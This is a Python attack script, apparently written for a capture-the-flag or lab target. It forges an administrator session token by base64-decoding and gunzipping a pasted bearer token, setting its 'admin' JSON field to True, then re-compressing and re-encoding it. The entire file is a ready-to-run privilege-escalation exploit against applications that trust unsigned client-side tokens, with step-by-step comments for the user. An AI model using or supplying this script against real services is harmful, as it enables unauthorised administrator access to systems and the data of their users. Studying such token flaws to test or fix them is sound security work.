import base64
import gzip
import json

# 1. PASTE YOUR ORIGINAL TOKEN HERE (Between the quotes)
# Do not include the word "Bearer ", just the long random string.
ORIGINAL_TOKEN = "H4sIACWTb2kC/6tWKi1OLcpLzE1VslJQKknNyU3My0jMylTSUVBKTMnNzAMKpyXmFKfWAgCFtRjEKgAAAA=="

def forge_token(token):
    try:
        # Step 1: Decode Base64
        # We use standard b64decode (web apps sometimes use urlsafe, but standard usually works here)
        decoded_bytes = base64.b64decode(token)
        
        # Step 2: Decompress GZIP
        json_bytes = gzip.decompress(decoded_bytes)
        json_str = json_bytes.decode('utf-8')
        
        print(f"[*] Original Payload: {json_str}")
        
        # Step 3: Modify JSON
        data = json.loads(json_str)
        if "admin" in data:
            data["admin"] = True
            print(f"[*] Modified Payload: {json.dumps(data)}")
        else:
            print("[!] Warning: 'admin' key not found in JSON.")
            
        # Step 4: Compress GZIP
        modified_json_str = json.dumps(data)
        compressed_data = gzip.compress(modified_json_str.encode('utf-8'))
        
        # Step 5: Encode Base64
        # We strip the newline character that python's base64 sometimes adds
        new_token = base64.b64encode(compressed_data).decode('utf-8')
        
        print("-" * 60)
        print("[+] NEW ADMIN TOKEN:")
        print(new_token)
        print("-" * 60)
        
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    forge_token(ORIGINAL_TOKEN)
